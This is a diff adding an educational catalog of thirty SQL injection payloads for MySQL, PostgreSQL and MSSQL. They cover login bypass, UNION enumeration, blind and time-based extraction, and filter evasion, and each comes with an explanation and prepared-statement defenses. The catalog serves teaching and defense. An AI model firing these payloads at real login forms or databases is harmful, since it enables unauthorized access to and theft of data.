@@ -1,0 +1,465 @@
+================================================================================
+PAYLOAD LAB - EDUCATIONAL TEMPLATE CATALOG
+================================================================================
+
+⚠️  WARNING: EDUCATIONAL USE ONLY
+⚠️  DO NOT USE FOR UNAUTHORIZED SECURITY TESTING
+
+Generated: 2026-02-14 23:19:54
+Total Payloads: 30
+
+================================================================================
+
+
+[1] sqli-001
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' OR '1'='1
+
+Explanation:
+  Classic SQL injection - creates always-true condition to bypass WHERE clause
+
+Defensive Notes:
+  Parameterized queries (prepared statements) prevent this entirely. Never concatenate user input into SQL.
+
+
+[2] sqli-002
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' OR 1=1--
+
+Explanation:
+  Boolean-based injection with comment - comments out rest of query
+
+Defensive Notes:
+  Prepared statements are the primary defense. Input validation as secondary layer.
+
+
+[3] sqli-003
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' OR '1'='1' #
+
+Explanation:
+  MySQL-specific comment syntax using # to terminate query
+
+Defensive Notes:
+  Use mysqli::prepare() or PDO with prepared statements. Never use mysql_query() with user input.
+
+
+[4] sqli-004
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mssql
+
+Template:
+  ' OR 1=1;--
+
+Explanation:
+  MSSQL semicolon query terminator with comment
+
+Defensive Notes:
+  Use SqlCommand with parameters in .NET. Avoid dynamic SQL construction.
+
+
+[5] sqli-005
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: postgres
+
+Template:
+  ' OR '1'='1' --
+
+Explanation:
+  PostgreSQL double-dash comment (note space after --)
+
+Defensive Notes:
+  Use $1, $2 parameterization in PostgreSQL. Library: pg with parameterized queries.
+
+
+[6] sqli-006
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' AND extractvalue(1,concat(0x7e,database())) --
+
+Explanation:
+  MySQL error-based data extraction using extractvalue() function
+
+Defensive Notes:
+  Prepared statements prevent injection. Additionally, principle of least privilege limits database access.
+
+
+[7] sqli-101
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' UNION SELECT NULL,NULL,NULL--
+
+Explanation:
+  UNION injection to discover column count - each NULL represents a column
+
+Defensive Notes:
+  Prepared statements block this. If dynamic SQL is unavoidable, strict whitelist validation is needed.
+
+
+[8] sqli-102
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' UNION SELECT 1,database(),user()--
+
+Explanation:
+  MySQL UNION to extract database name and current user
+
+Defensive Notes:
+  Defense-in-depth: prepared statements + least privilege database user + WAF monitoring.
+
+
+[9] sqli-103
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: postgres
+
+Template:
+  ' UNION SELECT NULL,current_database(),current_user--
+
+Explanation:
+  PostgreSQL UNION for information disclosure
+
+Defensive Notes:
+  Use parameterized queries exclusively. Avoid INFORMATION_SCHEMA access for app user.
+
+
+[10] sqli-104
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mssql
+
+Template:
+  ' UNION SELECT NULL,@@version,NULL--
+
+Explanation:
+  MSSQL version disclosure via UNION
+
+Defensive Notes:
+  Parameterized queries in SqlCommand. Restrict database permissions for application account.
+
+
+[11] sqli-105
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+
+Explanation:
+  UNION-based table name enumeration from information_schema
+
+Defensive Notes:
+  Prepared statements + restrict information_schema access + monitor for enumeration attempts.
+
+
+[12] sqli-201
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' AND 1=1--
+
+Explanation:
+  Blind boolean SQLi - true condition (page behaves normally)
+
+Defensive Notes:
+  Blind SQLi is harder to detect but still prevented by prepared statements. Monitor for repeated similar requests.
+
+
+[13] sqli-202
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' AND 1=2--
+
+Explanation:
+  Blind boolean SQLi - false condition (page behaves differently)
+
+Defensive Notes:
+  Rate limiting and anomaly detection can identify blind SQLi attempts. Primary defense: prepared statements.
+
+
+[14] sqli-203
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' AND SUBSTRING(database(),1,1)='a'--
+
+Explanation:
+  Blind SQLi character extraction - tests if first character of database name is 'a'
+
+Defensive Notes:
+  This demonstrates data exfiltration byte-by-byte. Prepared statements prevent the injection point.
+
+
+[15] sqli-204
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' AND ASCII(SUBSTRING(database(),1,1))>97--
+
+Explanation:
+  Blind binary search SQLi - compares ASCII value to narrow down characters
+
+Defensive Notes:
+  Monitoring for sequential boolean testing patterns can detect blind SQLi automation. Prevent with parameterization.
+
+
+[16] sqli-301
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' AND SLEEP(5)--
+
+Explanation:
+  MySQL time delay - causes 5-second delay if injection succeeds (DESCRIPTION ONLY - DO NOT EXECUTE)
+
+Defensive Notes:
+  Time-based attacks are stealthy but detectable via response time monitoring. Prevent with prepared statements.
+
+
+[17] sqli-302
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: postgres
+
+Template:
+  '; SELECT pg_sleep(5)--
+
+Explanation:
+  PostgreSQL time delay using pg_sleep() (DESCRIPTION ONLY)
+
+Defensive Notes:
+  Database activity monitoring can detect unusual sleep operations. Core defense: parameterized queries.
+
+
+[18] sqli-303
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mssql
+
+Template:
+  '; WAITFOR DELAY '00:00:05'--
+
+Explanation:
+  MSSQL time delay using WAITFOR (DESCRIPTION ONLY)
+
+Defensive Notes:
+  WAITFOR commands are suspicious in web contexts. Monitor for these + use prepared statements.
+
+
+[19] sqli-304
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' AND IF(1=1,SLEEP(5),0)--
+
+Explanation:
+  Conditional time delay - sleeps only if condition is true (DESCRIPTION ONLY)
+
+Defensive Notes:
+  Demonstrates data exfiltration via timing. Defense: prepared statements + query timeout limits.
+
+
+[20] sqli-401
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  admin'--
+
+Explanation:
+  Classic admin authentication bypass - comments out password check
+
+Defensive Notes:
+  Prepared statements prevent this. Additionally: proper password hashing, account lockout, MFA.
+
+
+[21] sqli-402
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' OR '1'='1'--
+
+Explanation:
+  Always-true condition to bypass login - returns first user (often admin)
+
+Defensive Notes:
+  Never build authentication queries with string concatenation. Use ORM or prepared statements.
+
+
+[22] sqli-403
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  admin' #
+
+Explanation:
+  MySQL comment-based auth bypass
+
+Defensive Notes:
+  Defense layers: prepared statements, rate limiting, CAPTCHA after failed attempts, logging.
+
+
+[23] sqli-404
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' OR 1=1 LIMIT 1--
+
+Explanation:
+  LIMIT clause to ensure single result in auth bypass
+
+Defensive Notes:
+  Prepared statements + secure session management + monitoring for suspicious logins.
+
+
+[24] sqli-501
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' OR '1'='1
+
+Explanation:
+  No comment needed if query structure allows - demonstrates basic filter evasion
+
+Defensive Notes:
+  Blacklist filters are ineffective. Whitelist validation + prepared statements required.
+
+
+[25] sqli-502
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' /*!50000OR*/ '1'='1
+
+Explanation:
+  MySQL conditional comment bypass - code inside executes only on MySQL 5.0+
+
+Defensive Notes:
+  Demonstrates why blacklisting fails. Use prepared statements, not regex filters.
+
+
+[26] sqli-503
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' OR/**/1=1--
+
+Explanation:
+  Comment-based space replacement - bypasses filters looking for ' OR ' with spaces
+
+Defensive Notes:
+  Attackers use many obfuscation tricks. Don't rely on pattern matching for SQL injection defense.
+
+
+[27] sqli-504
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' OORR '1'='1
+
+Explanation:
+  Demonstrates recursive filter bypass logic - if filter removes OR, this becomes ' OR '1'='1
+
+Defensive Notes:
+  Recursive sanitization or proper prepared statements needed. String replacement is insufficient.
+
+
+[28] sqli-505
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' UnIoN SeLeCt 1,2,3--
+
+Explanation:
+  Case variation to bypass case-sensitive filters
+
+Defensive Notes:
+  Filters should be case-insensitive. Better: use prepared statements, not filters.
+
+
+[29] sqli-506
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: mysql
+
+Template:
+  ' OR 0x31=0x31--
+
+Explanation:
+  Hex encoding of values (0x31 = '1') to evade simple pattern matching
+
+Defensive Notes:
+  Modern WAFs normalize hex encoding. Core defense remains prepared statements.
+
+
+[30] sqli-507
+--------------------------------------------------------------------------------
+Category: SQLI
+Database: generic
+
+Template:
+  ' OR CHAR(49)=CHAR(49)--
+
+Explanation:
+  Character code encoding to hide suspicious values
+
+Defensive Notes:
+  Demonstrates why signatures fail. Prepared statements treat entire input as data, not code.
+
+================================================================================
+End of Payload Catalog
+================================================================================
